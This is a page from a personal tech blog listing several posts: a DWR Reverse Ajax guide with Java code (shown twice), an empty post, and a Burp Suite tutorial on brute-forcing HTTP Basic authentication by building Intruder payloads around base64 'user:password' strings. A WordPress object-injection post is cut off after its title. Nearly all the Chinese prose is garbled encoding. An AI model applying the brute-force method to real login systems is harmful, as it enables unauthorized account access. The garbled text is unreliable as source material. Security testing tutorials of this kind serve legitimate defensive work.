
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 92 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>æç¤º:</strong>æ‚¨çš„æµè§ˆå™¨ç‰ˆæœ¬å¤ªä½äº†,å»ºè®®å‡çº§åˆ° <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> ä»¥ä¸Š,æœ¬ç«™ä½¿ç”¨<a href="https://www.google.com/intl/zh-CN/chrome/">Chromeæµè§ˆå™¨</a>å¯ä»¥è·å¾—æœ€å¥½çš„æ˜¾ç¤ºæ•ˆæœ.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-dwr--DWRReverseAjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹/">DWR Reverse AjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-dwr--DWRReverseAjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="dwr-reverse-ajax-">DWR Reverse AjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹</h1>
<ul>
<li><a href="http://wz.csdn.net/" target="_blank">ç½‘æ‘˜é¦–é¡µ</a></li>
<li><a href="http://wz.csdn.net/my" target="_blank">ç®¡ç†ç½‘æ‘˜</a></li>
<li><a href="http://wz.csdn.net/spy" target="_blank">å®æ—¶ç½‘æ‘˜</a></li>
<li><a href="http://wz.csdn.net/tool" target="_blank">å·¥å…·å’Œå¸®åŠ©</a></li>
</ul>
<h1 id="dwr-reverse-ajax-">DWR Reverse AjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹</h1>
<p>Reverse Ajaxä¸»è¦æ˜¯åœ¨BSæ¶æ„ä¸­ï¼Œä»æœåŠ¡å™¨ç«¯å‘å¤šä¸ªæµè§ˆå™¨ä¸»åŠ¨æ¨æ•°æ®çš„ä¸€ç§æŠ€æœ¯ã€‚å®ƒçš„ä¸€ç§å®ç°å°±æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨è¯·æ±‚åï¼ŒæœåŠ¡å™¨ä¸ç«‹å³å›åº”ï¼Œä»è€Œå¯¼è‡´ä¸€ä¸ªhttpé•¿è¿æ¥ï¼Œç­‰åˆ°æœ‰æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œå†åˆ©ç”¨è¿™ä¸ªè¿æ¥â€œä¸»åŠ¨â€å‘å®¢æˆ·ç«¯å›é€ã€‚
å¦‚æœæ˜¯åˆæ¬¡æ¥è§¦ï¼Œé‚£ä¸€å®šè¦çœ‹ä¸‹è¿™ç¯‡æ–‡ç« 
å…¶ä¸­ï¼Œè¯¦è¿°äº†è¿™ç§æŠ€æœ¯å’ŒJETTYæœåŠ¡å™¨ContinuationsåŠŸèƒ½ç»“åˆæ—¶çš„å¼ºå¤§æ€§èƒ½ï¼šè¿è¡Œåœ¨éé˜»å¡æ–¹å¼ä¸‹ï¼Œå½“å¤šä¸ªå®¢æˆ·ç«¯è¯·æ±‚æ—¶ä¸ä¼šå ç”¨è¿‡å¤šçº¿ç¨‹ã€‚
æœ€åï¼Œæ­¤æ–‡ç”³æ˜DWRçš„å®ç°å·²ç»å¤©ç„¶ä½¿ç”¨äº†JETTYè¿™ä¸€åŠŸèƒ½ã€‚æ‰€ä»¥ä½¿ç”¨DWRè¿˜æ˜¯éå¸¸æœ‰å¥½å¤„çš„ã€‚å¦‚ä½•ä½¿ç”¨åŠç¤ºä¾‹ä¸Šé¢è¿™ç¯‡æ–‡ç« å·²ç»æœ‰è¯´æ˜ï¼Œä¸‹é¢å°±ä»¥æˆ‘å®é™…ä½¿ç”¨ä¸­ç¢°åˆ°çš„é—®é¢˜å’Œè¦ç‚¹åšä¸ªè¯´æ˜ã€‚
é¦–å…ˆï¼Œè¯´ä¸€ä¸‹ä»£ç çš„ç»„ç»‡å’Œå£°æ˜ã€‚
å°†ä½¿ç”¨åˆ°Reverse Ajaxçš„ä»£ç å½’å…¥ä¸€ä¸ªç±»ï¼Œæ¯”å¦‚æ˜¯NotifyClientï¼Œå¹¶ç”¨springçš„beanæ¥å£°æ˜ã€‚åœ¨å°†è¦ç”¨åˆ°è¿™ä¸ªç±»çš„åœ°æ–¹(NodeSvcImplç±»)ï¼Œä¹Ÿé€šè¿‡æˆå‘˜å˜é‡å¼•å…¥:
ç„¶ååœ¨dwr.xmlé‡Œè¿™æ ·å£°æ˜ï¼š
å…¶æ¬¡ä¸€ä¸ªè¦ç‚¹æ˜¯ï¼Œå¦‚æœä½ ä¸æ˜¯åœ¨DWRæ‰€å¼€çš„çº¿ç¨‹ä¸­ä½¿ç”¨Reverse Ajaxï¼Œé‚£WebContextFactory.get()ä¼šè¿”å›ç©ºï¼Œè¿™æ˜¯å› ä¸ºåªæœ‰DWRè‡ªå·±çš„çº¿ç¨‹æ‰ä¼šåˆå§‹åŒ–å®ƒã€‚é‚£å¦‚æœä½ æ˜¯åœ¨DWRä¹‹å¤–ä½¿ç”¨ï¼Œæ¯”å¦‚è¯´æ”¶åˆ°JMSæ¶ˆæ¯ï¼Œæˆ–è€…UDPæ¶ˆæ¯åï¼Œæƒ³é€šçŸ¥æ‰€æœ‰å®¢æˆ·ç«¯ï¼Œä½ å°±è¦ç”¨åˆ°ServerContextã€‚
è¦å¾—åˆ°ServerContextï¼Œå°±éœ€è¦ç”¨åˆ°springçš„ServletContextAwareæ¥å£ï¼Œä¸‹é¢æ˜¯å®Œæ•´ä»£ç ï¼š
package com.hhh.nms.remote;
import org.apache.log4j.Logger;
import javax.servlet.ServletContext;
import org.springframework.web.context.ServletContextAware;
import java.util.Collection;
import org.directwebremoting.ScriptBuffer;
import org.directwebremoting.ScriptSession;
import org.directwebremoting.WebContext;
import org.directwebremoting.WebContextFactory;
import org.directwebremoting.ServerContext;
import org.directwebremoting.ServerContextFactory;
import org.directwebremoting.proxy.dwr.Util;
public class NotifyClient implements ServletContextAware {
static Logger logger = Logger.getLogger (NotifyClient.class.getName());
private ServletContext servletContext = null;
public void setServletContext( ServletContext servletContext )
{
this.servletContext = servletContext;
}
public int serviceUpdate (String str1, String str2) {
logger.info (&quot;entered&quot;);
logger.info (&quot;WebContext1&quot;+servletContext);
ServerContext ctx = ServerContextFactory.get(servletContext );
// Generate JavaScript code to call client-side
// WebContext ctx = WebContextFactory.get();
logger.info (&quot;WebContext&quot;+ctx);
if (ctx != null) {
//String currentPage = ctx.getCurrentPage();
//logger.info (&quot;current page:&quot; + currentPage);
ScriptBuffer script = new ScriptBuffer();
script.appendScript(&quot;updatePoint(&quot;)
.appendData(str1)
.appendScript(&quot;,&quot;)
.appendData (str2)
.appendScript(&quot;);&quot;);
// Push script out to clients viewing the page
Collection sessions =
ctx.getScriptSessionsByPage(&quot;/ebnms/index.eb?do=dwrtest&quot;);
logger.info (&quot;jsp session size:&quot; + sessions.size ());
// or
Collection sessions2 =
ctx.getAllScriptSessions ();
logger.info (&quot;all session size:&quot; + sessions2.size ());
for (ScriptSession session : sessions2) {
session.addScript(script);
}
}
return 0;
}
}
å¦å¤–ï¼ŒScriptBufferçš„appendScriptæ–¹æ³•æ˜¯æ’å…¥åŸå§‹å­—ä¸²ï¼ŒappendDataä¼šæ ¹æ®å‚æ•°ç±»å‹åšç›¸åº”è½¬æ¢ã€‚</p>
<p><a href="http://www.blogjava.net/alwayscy/archive/2007/11/01/157552.html" target="_blank"><a href="http://www.blogjava.net/alwayscy/archive/2007/11/01/157552.html">http://www.blogjava.net/alwayscy/archive/2007/11/01/157552.html</a></a></p>
<h1 id="-">ä»–ä»¬è®¾ç½®äº†å“ªäº›æ ‡ç­¾ï¼š</h1>
<p><a href="http://wz.csdn.net/tag/WEBÃ¥Â¼Â€Ã¥ÂÂ‘/" title="1ä¸ªç½‘æ‘˜" target="_blank">WEBå¼€å‘</a></p>
<h1 id="-">è°æ”¶è—äº†è¿™ä¸ªç½‘å€ï¼š</h1>
<h2 id="-conanpaul-http-wz-csdn-net-conanpaul-"><a href="http://wz.csdn.net/conanpaul/" target="_blank">conanpaul</a>æ”¶å½•</h2>
<p>ä½¿ç”¨æ ‡ç­¾ï¼š<a href="http://wz.csdn.net/conanpaul/Webå¼€å‘/" target="_blank">Webå¼€å‘</a>ï¼Œæ—¶é—´ï¼š2007-11-2 9:34:36 | <a href="http://wz.csdn.net/item/1204886/" target="_blank">ç›¸å…³ç½‘æ‘˜</a>
Reverse Ajaxä¸»è¦æ˜¯åœ¨BSæ¶æ„ä¸­ï¼Œä»æœåŠ¡å™¨ç«¯å‘å¤šä¸ªæµè§ˆå™¨ä¸»åŠ¨æ¨æ•°æ®çš„ä¸€ç§æŠ€æœ¯ã€‚å®ƒçš„ä¸€ç§å®ç°å°±æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨è¯·æ±‚åï¼ŒæœåŠ¡å™¨ä¸ç«‹å³å›åº”ï¼Œä»è€Œå¯¼è‡´ä¸€ä¸ªhttpé•¿è¿æ¥ï¼Œç­‰åˆ°æœ‰æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œå†åˆ©ç”¨è¿™ä¸ªè¿æ¥â€œä¸»åŠ¨â€å‘å®¢æˆ·ç«¯å›é€ã€‚
å¦‚æœæ˜¯åˆæ¬¡æ¥è§¦ï¼Œé‚£ä¸€å®šè¦çœ‹ä¸‹è¿™ç¯‡æ–‡ç« 
å…¶ä¸­ï¼Œè¯¦è¿°äº†è¿™ç§æŠ€æœ¯å’ŒJETTYæœåŠ¡å™¨ContinuationsåŠŸèƒ½ç»“åˆæ—¶çš„å¼ºå¤§æ€§èƒ½ï¼šè¿è¡Œåœ¨éé˜»å¡æ–¹å¼ä¸‹ï¼Œå½“å¤šä¸ªå®¢æˆ·ç«¯è¯·æ±‚æ—¶ä¸ä¼šå ç”¨è¿‡å¤šçº¿ç¨‹ã€‚
æœ€åï¼Œæ­¤æ–‡ç”³æ˜DWRçš„å®ç°å·²ç»å¤©ç„¶ä½¿ç”¨äº†JETTYè¿™ä¸€åŠŸèƒ½ã€‚æ‰€ä»¥ä½¿ç”¨DWRè¿˜æ˜¯éå¸¸æœ‰å¥½å¤„çš„ã€‚å¦‚ä½•ä½¿ç”¨åŠç¤ºä¾‹ä¸Šé¢è¿™ç¯‡æ–‡ç« å·²ç»æœ‰è¯´æ˜ï¼Œä¸‹é¢å°±ä»¥æˆ‘å®é™…ä½¿ç”¨ä¸­ç¢°åˆ°çš„é—®é¢˜å’Œè¦ç‚¹åšä¸ªè¯´æ˜ã€‚
é¦–å…ˆï¼Œè¯´ä¸€ä¸‹ä»£ç çš„ç»„ç»‡å’Œå£°æ˜ã€‚
å°†ä½¿ç”¨åˆ°Reverse Ajaxçš„ä»£ç å½’å…¥ä¸€ä¸ªç±»ï¼Œæ¯”å¦‚æ˜¯NotifyClientï¼Œå¹¶ç”¨springçš„beanæ¥å£°æ˜ã€‚åœ¨å°†è¦ç”¨åˆ°è¿™ä¸ªç±»çš„åœ°æ–¹(NodeSvcImplç±»)ï¼Œä¹Ÿé€šè¿‡æˆå‘˜å˜é‡å¼•å…¥:
ç„¶ååœ¨dwr.xmlé‡Œè¿™æ ·å£°æ˜ï¼š
å…¶æ¬¡ä¸€ä¸ªè¦ç‚¹æ˜¯ï¼Œå¦‚æœä½ ä¸æ˜¯åœ¨DWRæ‰€å¼€çš„çº¿ç¨‹ä¸­ä½¿ç”¨Reverse Ajaxï¼Œé‚£WebContextFactory.get()ä¼šè¿”å›ç©ºï¼Œè¿™æ˜¯å› ä¸ºåªæœ‰DWRè‡ªå·±çš„çº¿ç¨‹æ‰ä¼šåˆå§‹åŒ–å®ƒã€‚é‚£å¦‚æœä½ æ˜¯åœ¨DWRä¹‹å¤–ä½¿ç”¨ï¼Œæ¯”å¦‚è¯´æ”¶åˆ°JMSæ¶ˆæ¯ï¼Œæˆ–è€…UDPæ¶ˆæ¯åï¼Œæƒ³é€šçŸ¥æ‰€æœ‰å®¢æˆ·ç«¯ï¼Œä½ å°±è¦ç”¨åˆ°ServerContextã€‚
è¦å¾—åˆ°ServerContextï¼Œå°±éœ€è¦ç”¨åˆ°springçš„ServletContextAwareæ¥å£ï¼Œä¸‹é¢æ˜¯å®Œæ•´ä»£ç ï¼š
package com.hhh.nms.remote;
import org.apache.log4j.Logger;
import javax.servlet.ServletContext;
import org.springframework.web.context.ServletContextAware;
import java.util.Collection;
import org.directwebremoting.ScriptBuffer;
import org.directwebremoting.ScriptSession;
import org.directwebremoting.WebContext;
import org.directwebremoting.WebContextFactory;
import org.directwebremoting.ServerContext;
import org.directwebremoting.ServerContextFactory;
import org.directwebremoting.proxy.dwr.Util;
public class NotifyClient implements ServletContextAware {
static Logger logger = Logger.getLogger (NotifyClient.class.getName());
private ServletContext servletContext = null;
public void setServletContext( ServletContext servletContext )
{
this.servletContext = servletContext;
}
public int serviceUpdate (String str1, String str2) {
logger.info (&quot;entered&quot;);
logger.info (&quot;WebContext1&quot;+servletContext);
ServerContext ctx = ServerContextFactory.get(servletContext );
// Generate JavaScript code to call client-side
// WebContext ctx = WebContextFactory.get();
logger.info (&quot;WebContext&quot;+ctx);
if (ctx != null) {
//String currentPage = ctx.getCurrentPage();
//logger.info (&quot;current page:&quot; + currentPage);
ScriptBuffer script = new ScriptBuffer();
script.appendScript(&quot;updatePoint(&quot;)
.appendData(str1)
.appendScript(&quot;,&quot;)
.appendData (str2)
.appendScript(&quot;);&quot;);
// Push script out to clients viewing the page
Collection sessions =
ctx.getScriptSessionsByPage(&quot;/ebnms/index.eb?do=dwrtest&quot;);
logger.info (&quot;jsp session size:&quot; + sessions.size ());
// or
Collection sessions2 =
ctx.getAllScriptSessions ();
logger.info (&quot;all session size:&quot; + sessions2.size ());
for (ScriptSession session : sessions2) {
session.addScript(script);
}
}
return 0;
}
}
å¦å¤–ï¼ŒScriptBufferçš„appendScriptæ–¹æ³•æ˜¯æ’å…¥åŸå§‹å­—ä¸²ï¼ŒappendDataä¼šæ ¹æ®å‚æ•°ç±»å‹åšç›¸åº”è½¬æ¢ã€‚
<a href="http://www.hd315.gov.cn/beian/view.asp?bianhao=010202001032100010"></a></p>
<p><a href="http://www.csdn.net/help/intro.htm" target="_blank">ç½‘ç«™ç®€ä»‹</a>ï¼<a href="http://www.csdn.net/help/ads.htm" target="_blank">å¹¿å‘ŠæœåŠ¡</a>ï¼<a href="http://www.csdn.net/help/sitemap.htm" target="_blank">ç½‘ç«™åœ°å›¾</a>ï¼<a href="http://www.csdn.net/help/help.htm" target="_blank">å¸®åŠ©</a>ï¼<a href="http://www.csdn.net/help/contact.htm" target="_blank">è”ç³»æ–¹å¼</a>ï¼<a href="http://job.csdn.net/Jobs/f9c75c9f2ad14404a604669b757b9ed0/viewcompany.aspx" target="_blank">è¯šè˜è‹±æ‰</a>ï¼<a href="http://www.csdn.net/english/" target="_blank">English</a>ï¼<a href="http://wz.csdn.net/url/708367/#" target="_blank">é—®é¢˜æŠ¥å‘Š</a>
åŒ—äº¬ç™¾è”ç¾è¾¾ç¾æ•°ç ç§‘æŠ€æœ‰é™å…¬å¸ ç‰ˆæƒæ‰€æœ‰ äº¬ ICP è¯ 020026 å·
Copyright Â© 2000-2009, CSDN.NET, All Rights Reserved
<a href="http://www.vdoing.com/" title="Vdoing StatsX No.56805" target="_blank"><img src="" alt=""></a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/dwr/">dwr</a></li></span></span> | <span class="tags">Tagged <a href="/tags/dwr/" class="label label-primary">dwr</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-dwr--DWRReverseAjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-dwr--DWRReverseAjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-dwr--ajax_transportation_methods/">ajax_transportation_methods</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-dwr--ajax_transportation_methods/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="ajax_transportation_methods">ajax_transportation_methods</h1>
<p>**
æ­¤æ¼”ç¤ºæ–‡ç¨¿åŒ…å«æ‚¨çš„æµè§ˆå™¨ä¸èƒ½æ­£ç¡®æ˜¾ç¤ºçš„å†…å®¹ã€‚</p>
<p>å¦‚ä»è¦ç»§ç»­ï¼Œå•å‡» <a href="">æ­¤å¤„</a>.
**</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/dwr/">dwr</a></li></span></span> | <span class="tags">Tagged <a href="/tags/dwr/" class="label label-primary">dwr</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-dwr--ajax_transportation_methods/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-dwr--ajax_transportation_methods" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£/">Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTP bruteæš´åŠ›ç ´è§£</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="burpsuite-http-brute-">Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTP bruteæš´åŠ›ç ´è§£</h1>
<h3 id="burpsuite-http-brute-">Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTP bruteæš´åŠ›ç ´è§£</h3>
<p><a href="http://www.freebuf.com/articles/web/7457.html#" target="_blank"></a><a href="http://www.freebuf.com/author/gall" title="ç”± Gall å‘å¸ƒ">Gall</a> @ <a href="http://www.freebuf.com/category/articles/web" title="æŸ¥çœ‹ WEBå®‰å…¨ ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">WEBå®‰å…¨</a> 2013-02-28 å…± <strong>5644</strong> äººå›´è§‚</p>
<p>æ„Ÿè°¢<a href="http://www.freebuf.com/author/gall" target="_blank">Gall</a>æŠ•é€’</p>
<p><strong>å¸¸è§„çš„å¯¹username/passwprdè¿›è¡Œpayloadæµ‹è¯•ï¼Œæˆ‘æƒ³å¤§å®¶åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†**</strong>å¯¹äºAuthorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=è¿™æ ·çš„é—®é¢˜ï¼Œå¾ˆå¤šæœ‹å‹ç–‘æƒ‘äº†.**</p>
<p>ä¹‹å‰ï¼Œæˆ‘è®°å¾—æˆ‘ä»‹ç»è¿‡burpsuiteçš„intruderåŠŸèƒ½(<a href="http://www.freebuf.com/articles/5560.html" target="_blank">BurpSuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹SQL Injection</a>)ï¼Œæƒ³å¿…å¾ˆå¤šäººæ²¡ä»€ä¹ˆå°è±¡ï¼Œåœ¨æ­¤ï¼Œä»¥HTTP bruteé‡æintruderåŠŸèƒ½.</p>
<p>ä»¥ä¸‹é¢æ¡ˆä¾‹è¿›è¡Œè¯´æ˜(åªä½œæ¼”ç¤ºä¹‹ç”¨ï¼Œå…·ä½“ä»¥è‡ªå·±çš„ç›®æ ‡ä¸ºå‡†)</p>
<p><img src="" alt=""></p>
<p>Auth=dXNlcjpwYXNzd29yZA==å¤„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å…³é”®ä½ç½®.</p>
<p>é‚£ä¹ˆå…·ä½“è¯¥å¦‚ä½•åšå‘¢?å¤§è‡´æ“ä½œè¿‡ç¨‹å¦‚ä¸‹:</p>
<p>1.è§£å¯†base64å­—ç¬¦ä¸²2.ç”Ÿæˆæµ‹è¯•ç”¨çš„payload3.åˆ©ç”¨payloadè¿›è¡Œæµ‹è¯•</p>
<p><strong>1.è§£å¯†éªŒè¯ç”¨çš„base64å­—ç¬¦ä¸²</strong></p>
<p><img src="" alt=""></p>
<p>è§£å¯†åçš„å­—ç¬¦ä¸²ä¸º:</p>
<p>Auth=user:password</p>
<p>é—®é¢˜æ¥äº†ï¼Œé’ˆå¯¹user:passwordè¿™ç§å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•è®¾ç½®payloadå‘¢?</p>
<p>æƒ³å¿…å¾ˆå¤šäººåœ¨æ­¤å¤„äº†è´¹å°½å¿ƒæ€ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ¥ä¸‹æ¥è¯·çœ‹ç¬¬äºŒéƒ¨åˆ†ã€‚</p>
<p><strong>2.ç”Ÿæˆæµ‹è¯•ç”¨çš„payload</strong></p>
<p>å¯¹äºè¿™ç§æ ¼å¼ï¼Œæ— æ³•åˆ©ç”¨burpsuiteé¡ºåˆ©çš„å®Œæˆæµ‹è¯•ï¼Œé‚£ä¸ªå°±éœ€è¦ä¸°å¯Œå¯¹åº”çš„payloadäº†.</p>
<p>æˆ‘çš„åšæ³•å°±æ˜¯ï¼Œåˆ©ç”¨burpsuiteç”Ÿæˆæˆ‘è¦çš„payloadæ–‡æœ¬.</p>
<p>Auth=Â§userÂ§Â§:Â§Â§passwordÂ§</p>
<p>è®¾ç½®3å¤„payloadsï¼Œ</p>
<p>1 ------ Â§userÂ§2 ------ Â§:Â§3 ------ Â§passwordÂ§</p>
<p>ç„¶åæ ¹æ®intruderè‡ªå¸¦çš„battering ram/pitchfork/cluster bombç”Ÿæˆpayloads(æ ¹æ®è‡ªå·±çš„éœ€æ±‚ç”Ÿæˆ)</p>
<p>æˆ‘åœ¨æ­¤å¤„é€‰æ‹©ä»¥cluster bombä¸ºä¾‹ï¼Œåˆ©ç”¨intruderç”Ÿæˆéœ€è¦çš„payloadsï¼Œç„¶åä¿å­˜åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­.</p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p><strong>3.åˆ©ç”¨payloadè¿›è¡Œæµ‹è¯•</strong></p>
<p>æµ‹è¯•çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€‰ç”¨sniperï¼Œæˆ‘ä»¬åªéœ€ä¸€ä¸ªpayloadå˜é‡</p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p>è‹¥æœ‰ä¸è¶³ä¹‹å¤„ï¼Œæ¬¢è¿æŒ‡æ­£.</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span></span> | <span class="tags">Tagged <a href="/tags/å®‰å…¨/" class="label label-primary">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“/">WordPress </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--WordPress-361PHPå¯¹è±¡æ³¨å…¥æ¼æ´-WooYunçŸ¥è¯†åº“/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
